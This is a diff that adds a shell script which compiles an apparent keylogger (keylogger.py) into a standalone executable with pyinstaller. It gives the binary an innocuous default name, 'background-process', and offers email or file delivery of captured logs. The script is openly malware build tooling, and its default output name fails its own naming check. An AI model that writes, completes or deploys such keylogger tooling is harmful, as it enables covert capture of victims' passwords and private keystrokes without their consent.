@@ -1,0 +1,56 @@
+#!/bin/dash
+
+# usage: ./generate-exe [ -h(elp) ] [ -o(utputname) = ~/background-process ] [ -p(assphrase) = fishing-in-the-river-champion ] [ -l(ogsmethod) = [e(mail)|f(ile)]=f ]
+
+# shell script to generate the executable file for the keylogger
+# run this using dash to ensure greatest extent of POSIX compliance accross platforms
+# the executable will be moved to ~/-outputname
+
+outputname='/background-process'
+
+# these two can be set inside keylogger.py so only record if entered 
+passphrase=''
+logsmethod=''
+while [ $# -gt 0 ]
+do
+    flag="$1"
+    if [ "$flag" = '-h' ]
+    then
+        echo 'usage: ./generate-exe [ -h(elp) ] [ -o(utputname) = background-process ] [ -p(assphrase) = fishing-in-the-river-champion ] [ -l(ogsmethod) = [e(mail)|f(ile)]=f ]'
+        exit 0
+    fi
+    shift
+
+    item="$1"
+    if [ -z "$item" ]
+    then
+        echo "argument required for flag" 1>&2
+        exit 1
+    fi
+
+    case "$flag" in
+        '-o') outputname="$item" ;;
+        '-p') passphrase="$item" ;;
+        '-l') logsmethod="$item" ;;
+        *) echo "invalid flag ($flag)" 1>&2 ; exit 2 ;;
+    esac
+done
+
+# check only lowercase letters and hyphens
+# we can use the * quantifier to make empty strings pass the test
+compliant_phrase() {
+    echo "$1" | grep -Ex '[a-z-]*' > /dev/null || { echo "'$1' is not entirely made up of lowercase letters and hyphens" ; exit 3 ; }
+}
+
+# check phrases match naming requirements
+compliant_phrase "$outputname"
+compliant_phrase "$passphrase"
+
+# check that logging flag is valid
+echo "$logsmethod" | grep -Ex '[ef]*' || { echo "'$logsmethod' is not a valid logging method (valid ones are [ e(mail)|f(ile) ]" ; exit 4 ; }
+
+# delete any existing pyinstaller output
+./rm-pyinstaller > /dev/null 2>&1
+
+# now ready to build the file
+pyinstaller --onefile keylogger.py --name $outputname && cp dist/$outputname ~
